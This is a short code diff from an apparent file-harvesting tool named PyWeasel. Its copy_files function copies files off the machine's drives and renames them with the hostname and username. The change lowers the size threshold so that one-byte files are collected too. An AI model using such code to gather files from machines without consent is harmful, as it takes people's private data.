@@ -31,8 +31,9 @@ def drives_letter():
 
 
 def copy_files(files):
+
     prefix = socket.gethostname() + '_' + getpass.getuser() + '_'
     for file in files:
-        if os.path.normpath("PyWeasel") not in file and os.stat(file).st_size > 1:
+        if os.path.normpath("PyWeasel") not in file and os.stat(file).st_size >= 1:
             filename = prefix + os.path.basename(file)
             shutil.copy(file, os.path.join(sfiles_dir_exist(), filename))
